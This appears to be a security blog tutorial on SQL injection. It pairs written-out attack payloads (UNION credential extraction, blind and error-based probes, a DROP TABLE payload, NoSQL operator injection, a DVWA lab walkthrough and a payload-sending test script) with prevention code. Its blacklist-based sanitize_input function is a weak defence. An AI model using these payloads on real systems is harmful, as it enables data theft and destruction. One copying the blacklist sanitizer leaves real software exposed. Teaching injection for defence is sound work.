---
title: "SQL Injection: From Basic to Advanced"
date: "2024-02-20"
excerpt: "Deep dive into SQL injection techniques and prevention strategies..."
status: "in-progress"
journey: "appsec-labs"
tags: ["SQL Injection", "Web Security", "Database Security", "OWASP"]
---

# SQL Injection: From Basic to Advanced

SQL injection remains one of the most critical security vulnerabilities in web applications. This comprehensive guide takes you from basic understanding to advanced exploitation techniques and robust prevention strategies.

## What is SQL Injection?

SQL injection occurs when an application incorporates untrusted data into SQL queries without proper validation or parameterization. This allows attackers to manipulate database queries and potentially:

- Extract sensitive data
- Bypass authentication mechanisms  
- Modify or delete database records
- Execute administrative operations on the database

## Basic SQL Injection Techniques

### 1. Union-Based SQL Injection

```sql
-- Original query
SELECT id, name, email FROM users WHERE id = '1'

-- Malicious input: 1' UNION SELECT 1,username,password FROM admin_users--
-- Resulting query
SELECT id, name, email FROM users WHERE id = '1' UNION SELECT 1,username,password FROM admin_users--'
```

### 2. Boolean-Based Blind SQL Injection

When the application doesn't return database errors or results directly, attackers can infer information based on application behavior:

```sql
-- Test if current user is 'admin'
1' AND (SELECT SUBSTRING(USER(),1,5))='admin'--

-- Extract database name character by character
1' AND (SELECT SUBSTRING(DATABASE(),1,1))='a'--
```

### 3. Time-Based Blind SQL Injection

```sql
-- MySQL time delay
1' AND IF(1=1, SLEEP(5), 0)--

-- PostgreSQL time delay  
1'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 0 END--
```

## Advanced Techniques

### Error-Based SQL Injection

Exploiting database error messages to extract information:

```sql
-- MySQL error-based extraction
1' AND extractvalue(0x0a,concat(0x0a,(SELECT database())))--

-- PostgreSQL error-based
1' AND cast((SELECT version()) as int)--
```

### Second-Order SQL Injection

Occurs when user input is stored and later used in SQL queries without proper sanitization:

1. Insert malicious payload: `admin'; DROP TABLE users;--`
2. Application stores the payload
3. Later query uses stored data: `SELECT * FROM logs WHERE user='admin'; DROP TABLE users;--'`

### NoSQL Injection

Modern applications using NoSQL databases are also vulnerable:

```javascript
// MongoDB injection
{"username": {"$ne": null}, "password": {"$ne": null}}

// CouchDB injection  
{"selector": {"username": {"$gt": ""}}}
```

## Detection and Exploitation Tools

### Manual Testing Payloads

```sql
-- Common test strings
'
"
\
''
""
1' OR '1'='1
1" OR "1"="1
1' OR '1'='1'--
1" OR "1"="1"--
' OR 1=1#
" OR 1=1#
```

### Automated Tools

- **SQLMap**: Most comprehensive SQL injection tool
- **Burp Suite**: Professional web application security testing
- **OWASP ZAP**: Free security testing proxy

## Prevention Strategies

### 1. Parameterized Queries (Prepared Statements)

**Java (JDBC):**
```java
String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement stmt = connection.prepareStatement(sql);
stmt.setString(1, username);
stmt.setString(2, password);
ResultSet rs = stmt.executeQuery();
```

**PHP (PDO):**
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
```

**Node.js (MySQL):**
```javascript
const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
connection.query(query, [username, password], (error, results) => {
    // Handle results
});
```

### 2. Input Validation and Sanitization

```python
import re

def validate_username(username):
    # Only allow alphanumeric characters and underscores
    if re.match("^[a-zA-Z0-9_]+$", username):
        return True
    return False

def sanitize_input(user_input):
    # Remove dangerous characters
    dangerous_chars = ["'", '"', ";", "--", "/*", "*/"]
    for char in dangerous_chars:
        user_input = user_input.replace(char, "")
    return user_input
```

### 3. Stored Procedures (When Properly Implemented)

```sql
-- SQL Server stored procedure
CREATE PROCEDURE GetUser
    @Username NVARCHAR(50),
    @Password NVARCHAR(50)
AS
BEGIN
    SELECT * FROM Users 
    WHERE Username = @Username AND Password = @Password
END
```

### 4. Principle of Least Privilege

- Database users should have minimal necessary permissions
- Separate database accounts for different application functions
- Avoid using administrative accounts for application connections

### 5. Web Application Firewalls (WAF)

Configure WAF rules to detect and block common SQL injection patterns:

```
# ModSecurity rules example
SecRule ARGS "@detectSQLi" \
    "id:1001,\
    phase:2,\
    block,\
    msg:'SQL Injection Attack Detected',\
    logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}'"
```

## Lab Exercise: Vulnerable Application

### Setup Instructions

1. **Download DVWA (Damn Vulnerable Web Application)**
2. **Configure environment with XAMPP/WAMP**
3. **Set security level to "Low" for initial testing**

### Exercise 1: Basic SQL Injection

Target: DVWA SQL Injection module

```sql
-- Step 1: Test for vulnerability
Input: ' OR '1'='1

-- Step 2: Determine number of columns
Input: ' UNION SELECT NULL-- 
Input: ' UNION SELECT NULL,NULL--

-- Step 3: Extract database information
Input: ' UNION SELECT database(),version()--
```

### Exercise 2: Blind SQL Injection

```sql
-- Test if first character of database name is 'd'
1' AND (SELECT SUBSTRING(DATABASE(),1,1))='d'--

-- Extract full database name
1' AND LENGTH(DATABASE())=4--
```

## Real-World Case Studies

### Case Study 1: Heartland Payment Systems (2008)

- **Impact**: 134 million credit card numbers stolen
- **Method**: SQL injection through web application
- **Lesson**: Importance of input validation and PCI compliance

### Case Study 2: Sony Pictures (2011)

- **Impact**: 1 million user accounts compromised
- **Method**: SQL injection via web form
- **Lesson**: Defense in depth and regular security testing

## Advanced Defense Mechanisms

### 1. Runtime Application Self-Protection (RASP)

```java
// Example conceptual RASP implementation
public class SQLInjectionRASP {
    public static boolean detectSQLInjection(String query, String input) {
        // Analyze query structure before and after input
        String baselineQuery = generateQueryStructure(query);
        String inputQuery = generateQueryStructure(query.replace("?", input));
        
        return !baselineQuery.equals(inputQuery);
    }
}
```

### 2. Database Activity Monitoring (DAM)

Monitor and alert on suspicious database activities:
- Unusual query patterns
- Access to sensitive tables
- Failed authentication attempts
- Privilege escalation attempts

## Testing and Validation

### 1. Static Code Analysis

```bash
# Using SonarQube for Java
sonar-scanner \
  -Dsonar.projectKey=myproject \
  -Dsonar.sources=src \
  -Dsonar.host.url=http://localhost:9000

# Using Semgrep for multiple languages  
semgrep --config=security.sql-injection .
```

### 2. Dynamic Testing

```python
# Simple SQL injection test script
import requests

def test_sql_injection(url, parameter):
    payloads = [
        "'",
        "' OR '1'='1",
        "'; DROP TABLE users;--",
        "' UNION SELECT NULL--"
    ]
    
    for payload in payloads:
        data = {parameter: payload}
        response = requests.post(url, data=data)
        
        if "error" in response.text.lower() or "sql" in response.text.lower():
            print(f"Potential SQL injection found with payload: {payload}")
```

## Conclusion

SQL injection continues to be a critical threat that requires:

1. **Developer Education**: Understanding secure coding practices
2. **Defense in Depth**: Multiple layers of protection
3. **Regular Testing**: Both automated and manual security testing
4. **Continuous Monitoring**: Runtime protection and anomaly detection

The key to preventing SQL injection is treating all user input as potentially malicious and implementing proper validation, sanitization, and parameterization at every level of the application.

## Next Steps

- Practice with intentionally vulnerable applications (DVWA, WebGoat)
- Learn about advanced database security features
- Explore NoSQL injection techniques
- Study real-world breach reports and lessons learned

---

*Remember: These techniques should only be used on systems you own or have explicit permission to test. Unauthorized testing is illegal and unethical.*
